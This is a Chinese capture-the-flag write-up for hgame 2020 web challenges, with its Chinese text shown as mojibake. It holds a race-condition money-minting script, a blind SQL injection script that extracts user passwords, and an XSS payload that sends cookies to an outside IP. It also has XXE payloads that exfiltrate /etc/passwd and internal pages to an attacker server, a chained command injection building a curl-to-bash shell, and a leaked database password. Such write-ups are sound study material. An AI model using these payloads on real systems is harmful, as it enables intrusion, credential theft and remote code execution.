title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h4><p>å¼±å¯†ç ç™»é™†åˆ«äººè´¦å·,ç›´æ¥æŠ„ä½œä¸š</p><p>admin,123456</p><h4 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h4><p>æ¡ä»¶ç«äº‰</p><p>åœ¨ä¸€æ¬¡å¶ç„¶çš„çˆ†ç ´ä¸­æˆ‘å‘ç°,å•†å“çš„æ•°é‡å¤šäº†,äºæ˜¯ä¾¿çŒœæµ‹æœ‰æ¡ä»¶ç«äº‰æ¼æ´</p><p>æˆ‘æ¥æ¨¡æ‹Ÿä»¥ä¸‹é€ æˆæ¡ä»¶ç«äº‰æ¼æ´çš„åŸå› </p><p>é¦–å…ˆçŒœæµ‹ä»¥ä¸‹solveå’Œbuyæ–¹æ³•çš„æµç¨‹</p><pre><code class="php">function solve(){    #1. $num=ä»æ•°æ®åº“ä¸­æŸ¥æ‰¾è¦ç”¨æˆ·æŒæœ‰çš„å–å‡ºå•†å“çš„ä¸ªæ•°    #2. å¦‚æœæ•°é‡è¶³å¤Ÿ,åˆ™è¿›è¡Œä¸‹ä¸€æ­¥,å¦åˆ™è¿”å›å¹¶æŠ¥é”™    #3. åœ¨æ•°æ®åº“ä¸­å¢åŠ ç”¨æˆ·è´¦æˆ·é‡Œçš„é’±    #4. åœ¨æ•°æ®åº“ä¸­å‡å°‘ç”¨æˆ·æ‹¥æœ‰è¯¥å•†å“çš„æ•°é‡}</code></pre><p>å‡è®¾webæœåŠ¡å™¨åœ¨ç›¸å·®ä¸€ä¸ªæ­¥éª¤çš„æ—¶é—´æ—¶æ”¶åˆ°ä¸¤ä¸ªè¯·æ±‚,æ­¤æ—¶forkå‡ºä¸¤ä¸ªè¿›ç¨‹a,b,è®¾æ­¤æ—¶å•†å“æ•°é‡ä¸º1,ä¸¤ä¸ªè¯·æ±‚è¦å–å‡ºçš„æ•°é‡ä¹Ÿéƒ½ä¸º1</p><ol><li>a æ‰§è¡Œå®Œæ­¥éª¤1(<code>$num=1</code>);båˆšè¦å¼€å§‹æ‰§è¡Œæ­¥éª¤1</li><li>aæ‰§è¡Œå®Œæ­¥éª¤äºŒ;bæ‰§è¡Œå®Œæ­¥éª¤ä¸€(<code>$num=1</code>)</li><li>aæ‰§è¡Œæ­¥éª¤ä¸‰,ç”¨æˆ·è´¦æˆ·é‡Œçš„é’±å¢åŠ äº†;bæ‰§è¡Œå®Œæ­¥éª¤äºŒ,bè¿›ç¨‹ä¹Ÿæ»¡è¶³æ¡ä»¶</li><li>aæ‰§è¡Œæ­¥éª¤å››,æ­¤æ—¶æ•°æ®åº“ä¸­å•†å“çš„æ•°é‡ä¸º0,bæ‰§è¡Œå®Œæ­¥éª¤ä¸‰,ç”¨æˆ·è´¦æˆ·é‡Œçš„é’±å¢åŠ äº†</li><li>aè¿›ç¨‹ç»“æŸ;bè¿›ç¨‹è¯•å›¾å‡å°‘æ•°æ®åº“ä¸­å•†å“çš„æ•°é‡,ä½†æ˜¯æ•°é‡æœ€å°ä¸º0,æ“ä½œå¤±è´¥</li><li>bè¿›ç¨‹ç»“æŸ</li></ol><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ€ç»ˆç»“æœæ˜¯,ç”¨æˆ·ç”¨1å•ä½çš„å•†å“å–å‡ºäº†ä¸¤ä¸ªå•ä½å•†å“çš„ä»·é’±(1ä¸ªå•†å“è¢«å–äº†ä¸¤æ¬¡)</p><p>ä¸ºå•¥ä¼šè¿™æ ·,è¿™æ˜¯åŒæ—¶æ“ä½œä¸€ä¸ªæ•°æ®å¯¼è‡´çš„bug,è¿™ä¹Ÿæ˜¯ä¸ºå•¥è®¡ç®—æœºé‡Œç»å¸¸å‡ºç°é”è¿™ä¸ªåç§°çš„åŸå› ,ç»™æ•°æ®ä¸Šé”,é¿å…ä¸¤ä¸ªè¿›ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªæ•°æ®,å¯¼è‡´bug</p><p>åˆ·é’±è„šæœ¬</p><pre><code class="python">from multiprocessing import Poolimport requestsdef buy(num,loop=3):    for i in range(loop):        burp0_url = &quot;http://121.36.88.65:9999/API/?method=buy&quot;        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text        if &quot;success&quot; in result:            print(&quot;successfully buy %d items&quot; % num)def solve(num,loop=3):    for i in range(loop):        burp0_url = &quot;http://121.36.88.65:9999/API/?method=solve&quot;        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text        if &quot;success&quot; in result:            print(&quot;successfully solve %d items&quot; % num)if __name__==&#39;__main__&#39;:    i=0    while True:        p = Pool(100)        num=500        for i in range(100):            p.apply_async(buy, args=(num,))        print(&#39;Waiting for all buy subprocesses done...&#39;)        p.close()        p.join()        print(&#39;All subprocesses done.&#39;)        p = Pool(100)        for i in range(100):            p.apply_async(solve, args=(num,))        print(&#39;Waiting for all solve subprocesses done...&#39;)        p.close()        p.join()        print(&#39;All subprocesses done.&#39;)</code></pre><h3 id="ç•™è¨€æ¿"><a href="#ç•™è¨€æ¿" class="headerlink" title="ç•™è¨€æ¿"></a>ç•™è¨€æ¿</h3><p>æ³¨å†Œç™»é™†çš„é»‘åå•</p><pre><code class="python">allow: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;_&#39;, &#39;\n&#39;]disable: [&#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;, &quot;&#39;&quot;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;, &#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\x0b&#39;, &#39;\x0c&#39;]</code></pre><p>ä¸€ä¸ªä¸ªæ£€æµ‹è¾“å…¥ç‚¹å‘ç°,deleteæ–¹æ³•å­˜åœ¨sqlæ³¨å…¥</p><p>æ³¨å…¥è„šæœ¬</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupdef send():    burp0_url = &quot;http://139.199.182.61:19999/index.php?method=send&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    burp0_data = {&quot;message&quot;: &quot;aaa&quot;}    res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)    if res.status_code==200:        return 1    else :        return 0def get_id():    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)    html = res.text    try :        soup = BeautifulSoup(html,&#39;html.parser&#39;) #æŠŠç½‘é¡µè§£æä¸ºBeautifulSoupå¯¹è±¡        url=soup.find(&quot;span&quot;,class_=&quot;message&quot;).find(&quot;a&quot;)[&#39;href&#39;]    except:        return False    return url.replace(&quot;index.php?method=delete&amp;delete_id=&quot;,&quot;&quot;)def check(mesid):    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)    url=&quot;index.php?method=delete&amp;delete_id=&quot;+str(mesid)    if url in res.text:        return True    return False#index.php?method=delete&amp;delete_id=6594def delete(mesid):    burp0_url = &quot;http://139.199.182.61:19999/index.php&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    requests.get(burp0_url, params={&quot;method&quot;:&quot;delete&quot;,&quot;delete_id&quot;:mesid},headers=burp0_headers, cookies=burp0_cookies)def sql_inj(sql):    mesid=get_id()    delete(str(mesid)+&quot; and (&quot;+sql+&quot;) #&quot;)    if not check(mesid):        print(&quot;%s success&quot; % sql)        send()        return True    print(&quot;%s fail&quot; % sql)    return False# sql_inj(&quot;(select substr(hex(&#39;1&#39;),1,1))=&#39;3&#39;&quot;)cha=&quot;0123456789ABCDEF&quot;result=&quot;&quot;p=0while True:    p+=1    temp=&#39;&#39;    for i in cha:        if sql_inj(&quot;(select substr(hex(group_concat(name,&#39;,&#39;,password)),%d,1) FROM user where id=1)=&#39;%s&#39;&quot; % (p,i) ):            result+=i            temp=i            print(result)            break    if temp!=result[-1]:        break#information_schema,babysql#messages,user#id,name,password</code></pre><h3 id="Cosmosçš„èŠå¤©å®¤2-0"><a href="#Cosmosçš„èŠå¤©å®¤2-0" class="headerlink" title="Cosmosçš„èŠå¤©å®¤2.0"></a>Cosmosçš„èŠå¤©å®¤2.0</h3><p>æ“æ“æ“,è¿™é¢˜å¯¹æˆ‘æœ‰æ¯’,æˆ‘è¿™é‡Œä¸æ˜¾ç¤ºcsp,å¯¼è‡´æˆ‘å¡äº†å¾ˆä¹…</p><p>å­˜åœ¨csp:</p><pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></pre><p>å…ˆæ£€æµ‹ä¸€ä¸‹</p><p> <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p><p><img src="https://i.loli.net/2020/02/06/xmcQvbWV7EXRisq.png" alt="image19320"></p><p>è¯´object-srcä¸å®‰å…¨</p><p>è¿™ä¸ªç­–ç•¥å·²ç»banæ‰äº†å†…è”è„šæœ¬,æ‰€ä»¥æˆ‘ä»¬ç›´æ¥ä¼ ä¸€ä¸ªjsä»£ç è¿‡å»æ²¡ç”¨</p><p>æˆ‘ä»¬å¯¹sendæ–¹æ³•è¿›è¡Œæ£€æµ‹å‘ç°,ä¼šè¿‡æ»¤script,ä½†æ˜¯ç”¨åŒå†™å°±å¯ä»¥ç»•è¿‡,è¿˜ä¼šæŠŠå¤§å†™è½¬æˆå°å†™</p><p>ç”¨burpä»£ç†,æŸ¥çœ‹å‘é€çš„è¯·æ±‚,æˆ‘ä»¬å¯ä»¥ä¼šæ³¨æ„åˆ°<code>/send</code>ä¼šç›´æ¥è¿”å›æˆ‘ä»¬å‘é€çš„å†…å®¹,åˆ©ç”¨è¿™ä¸ªæ°å¥½å¯ä»¥ç»•è¿‡<code>script-src &#39;self&#39;</code> ,</p><p>æˆ‘ä»¬å‘é€ä»¥ä¸‹payload(ç”¨scriptæ ‡ç­¾ä¹Ÿä¸€æ ·)</p><pre><code>&lt;iframe src=&quot;send?message=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%22%61%6c%65%72%74%28%29%22%3e&quot;&gt;&lt;/iframe&gt;</code></pre><p>æˆåŠŸå¼¹çª—,ä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰<code>default-src &#39;self&#39;</code>é˜»ç¢ç€æˆ‘ä»¬å¸¦å›æ•°æ®</p><p>å› ä¸ºæ²¡æœ‰è®¾ç½®<code>object-src</code>æˆ‘ä»¬å¯ä»¥ç”¨<code>embed</code>æ ‡ç­¾å¸¦å›æ•°æ®</p><p>æœ€åçš„payload</p><pre><code>&lt;iframe src=&quot;send?message=&lt;body&gt;&lt;scscrscriptiptript&gt;var+iframe+%3d+eval(%22document.create\105lement(&#39;embed&#39;)%22)%3biframe.src%3d%22http%3a//39.108.164.219%3a60005/%3f%22%2bdocument.cookie%3beval(%22document.body.append\103hild(iframe)%22)%3b&lt;/scrscrscriptiptipt&gt;&lt;/body&gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p><code>hgame{1ts_@_$impL3_CSP_bYp4ss1ng_Ch@!!enge.}</code></p><h3 id="ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ"><a href="#ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ" class="headerlink" title="ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ"></a>ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ</h3><p>ä¸€çœ‹å°±çŸ¥é“æœ‰xxeæ¼æ´</p><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;%sp;%param1;]&gt;&lt;r&gt;&amp;exfil;&lt;/r&gt;File stored on http://39.108.164.219/evil.xml&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><p>submit.php</p><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try{    $stmt = $conn-&gt;prepare(&quot;INSERT INTO info (id, chal_name, bd_level, bd_time) VALUES (:id, :chal_name, :bd_level, :bd_time)&quot;);    $stmt-&gt;bindParam(&#39;:id&#39;, $id);    $stmt-&gt;bindParam(&#39;:chal_name&#39;, $chal_name);    $stmt-&gt;bindParam(&#39;:bd_level&#39;, $level);    $stmt-&gt;bindParam(&#39;:bd_time&#39;, $level);    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $id = $creds-&gt;id;    $chal_name = $creds-&gt;name;    $level = $creds-&gt;level;    $time = $creds-&gt;time;    if ($id == &quot;&quot; || $level == &quot;&quot; || $chal_name == &quot;&quot;|| $time == &quot;&quot;) {        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;è¯·å¡«å†™ä¿¡æ¯ï¼&quot;);        die($result);    }    $stmt-&gt;execute();    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,&quot;å·²æäº¤æˆåŠŸï¼Œæ­£åœ¨ä¸ºæ‚¨å®‰æ’æ‰“æ‰‹&quot;);}catch(Exception $e){    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;æäº¤å¤±è´¥ï¼&quot;);}header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p>config.php</p><pre><code class="php">&lt;?php$dbms=&#39;mysql&#39;;$host=&#39;localhost&#39;;$dbName=&#39;bdctr_message&#39;;$user=&#39;root&#39;;$pass=&#39;yevi1gcqpqHSaOZVDI1CcRLaHHSJ5BYgImof&#39;;$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));$conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);?&gt;</code></pre><p>åŸæœ¬æƒ³ç€ç”¨gopheræ‰§è¡Œsqlè¯­å¥,ä½†æ˜¯æœ‰å¯†ç æ— æ³•æ‰§è¡Œ</p><p>æˆ‘æˆ‘æˆ‘æˆ‘æ˜¯ä¸ªdsb,æ˜æ˜çŸ¥é“å¯èƒ½æ˜¯å†…ç½‘æœ‰å¯èƒ½ç”±å…¶ä»–ä¸»æœº,ä½†å°±æ˜¯ä¸è¯•ä¸€ä¸‹</p><pre><code>IP address       HW type     Flags       HW address            Mask     Device172.21.0.5       0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.1       0x1         0x2         02:42:f7:6e:6f:34     *        eth0172.21.0.6       0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.2       0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.32      0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.75      0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.7       0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.76      0x1         0x2         02:42:ac:15:00:4c     *        eth0172.21.0.30      0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.77      0x1         0x0         00:00:00:00:00:00     *        eth0</code></pre><pre><code>127.0.0.1    localhost::1    localhost ip6-localhost ip6-loopbackfe00::0    ip6-localnetff00::0    ip6-mcastprefixff02::1    ip6-allnodesff02::2    ip6-allrouters172.21.0.76    hgame-private172.21.0.31    f9f1b9b99e13</code></pre><p>å‘ç°ä¸€ä¸ªå†…ç½‘æœåŠ¡å™¨<code>172.21.0.76</code></p><p>å½“å°è¯•è®¿é—®80ç«¯å£æ—¶,å‘ç°æ–‡ä»¶å¤ªå¤§ç­‰ä¸€ç³»åˆ—é—®é¢˜</p><blockquote><p>ä½¿ç”¨libxmlè¯»å–æ–‡ä»¶æ—¶,æ–‡ä»¶ä¸èƒ½å¤ªå¤§å¦åˆ™ä¼šæŠ¥é”™</p></blockquote><p>äºæ˜¯å°è¯•å‹ç¼©èƒ½ä¸èƒ½è¯»å–</p><pre><code>&lt;?php    error_reporting(0);    file_put_contents(&quot;tmp&quot;,base64_decode(str_replace(&#39; &#39;,&#39;+&#39;,$_GET[&#39;a&#39;])));    $a=file_get_contents(&quot;php://filter/read=zlib.inflate/resource=tmp&quot;);    file_put_contents(&quot;mes/&quot;.date(&quot;h_m_s&quot;).&quot;.txt&quot;,$a);?&gt;</code></pre><pre><code>&lt;!ENTITY % data SYSTEM &quot;php://filter/zlib.deflate/convert.base64-encode/resource=http://172.21.0.76&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><pre><code class="php">&lt;?phperror_reporting(0);$token = @$_GET[&#39;token&#39;];if (!isset($token)) {    die(&quot;è¯·å¸¦ä¸Šæ‚¨çš„é˜Ÿä¼tokenè®¿é—®! /?token=&quot;);}$api = &quot;http://checker/?token=&quot;.$token;$t = file_get_contents($api);if($t !== &quot;ok&quot;) {    die(&quot;é˜Ÿä¼tokené”™è¯¯&quot;);}highlight_file(__FILE__);$sandbox = &#39;/var/www/html/sandbox/&#39;. md5(&quot;hgame2020&quot; . $token);;@mkdir($sandbox);@chdir($sandbox);$content = $_GET[&#39;v&#39;];if (isset($content)) {    $cmd = substr($content,0,5);    system($cmd);}else if (isset($_GET[&#39;r&#39;])) {    system(&#39;rm -rf ./*&#39;);}/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | | | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_| |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)                                    |/*/</code></pre><p>ç„¶ååˆ©ç”¨ <a href="https://err0rzz.github.io/2017/11/13/ctfå‘½ä»¤æ‰§è¡Œä¸ç»•è¿‡/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</a> </p><p>çš„æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤</p><pre><code class="php">&lt;?php    $a=file_get_contents(&quot;tmp.xml&quot;);    $command=array(    &#39;&gt;ls\\\\&#39;,     &#39;ls&gt;_&#39;,     &#39;&gt;\\ \\\\&#39;,     &#39;&gt;-t\\\\&#39;,     &#39;&gt;\\&gt;g&#39;,     &#39;ls&gt;&gt;_&#39;,    &quot;&gt;bash&quot;,    &quot;&gt;\\|\\\\&quot;,    &quot;&gt;5\\\\&quot;,    &quot;&gt;00\\\\&quot;,    &quot;&gt;60\\\\&quot;,    &quot;&gt;9:\\\\&quot;,    &quot;&gt;21\\\\&quot;,    &quot;&gt;4.\\\\&quot;,    &quot;&gt;16\\\\&quot;,    &quot;&gt;8.\\\\&quot;,    &quot;&gt;10\\\\&quot;,    &quot;&gt;9.\\\\&quot;,    &quot;&gt;3\\\\&quot;,    &quot;&gt;\\ \\\\&quot;,    &quot;&gt;rl\\\\&quot;,    &quot;&gt;cu\\\\&quot;    );    foreach($command as $v)    {        echo $v.&quot;\n&quot;;        $v=urlencode($v);        file_put_contents(&quot;evil.xml&quot;,str_replace(&quot;TGT&quot;,$v,$a));        $postdata=&lt;&lt;&lt;MRK&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE msg [&lt;!ELEMENT msg ANY &gt;&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;%sp;%param1;]&gt;&lt;msg&gt;&lt;id&gt;&amp;exfil;&lt;/id&gt;&lt;name&gt;b&lt;/name&gt;&lt;level&gt;c&lt;/level&gt;&lt;time&gt;d&lt;/time&gt;&lt;/msg&gt;MRK;        $opts = array(&#39;http&#39; =&gt;         array( &#39;method&#39;  =&gt; &#39;POST&#39;,        &#39;header&#39;  =&gt; &#39;Content-type: application/x-www-form-urlencoded&#39;,        &#39;content&#39; =&gt; $postdata )     );        $context = stream_context_create($opts);        file_get_contents(&quot;http://bdctr.hgame.day-day.work/submit.php&quot;, false, $context);    }?&gt;</code></pre><p>åœ¨ç»å†ä¸€æ¬¡rm -rf ä¹‹å,ç»ˆäºæ‹¿åˆ°getshell</p><p><img src="https://i.loli.net/2020/02/17/IDFPmldJKNhEHt7.png" alt="image26112"></p><p><code>hgame{XxE!@SsrF_4nD_f1lt3rEd_Rc3_1s_Co0l!}</code></p><h3 id="sekiro"><a href="#sekiro" class="headerlink" title="sekiro"></a>sekiro</h3><p>åˆšæ‹¿åˆ°é¢˜ç›®çš„æ—¶å€™,æˆ‘å¿ƒæ€è¢«ç¬¬ä¸€é¢˜æå´©äº†,éšä¾¿çœ‹äº†ä¸€ä¸‹,å°±æºœå»æ‰“æ¸¸æˆäº†,çœ‹äº†wp,è‰¹</p><p>æ‹¿åˆ°é¢˜ç›®,æ˜¯æˆ‘ä¸ç†Ÿæ‚‰çš„nodejs</p><p>å½±å“ä¸å¤§,çœ‹ä¸ªå¤§æ¦‚å°±ä¼šäº†</p><p><code>\route\index.js</code></p><pre><code class="javascript">router.post(&#39;/action&#39;, function (req, res) {  if (!req.session.sekiro) {    res.end(&quot;Session required.&quot;)  }  if (!req.session.sekiro.alive) {    res.end(&quot;You dead.&quot;)  }  var body = JSON.parse(JSON.stringify(req.body));//åŸå‹é“¾æ±¡æŸ“èµ·ç‚¹  var copybody = clone(body)  if (copybody.solution) {    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)  }  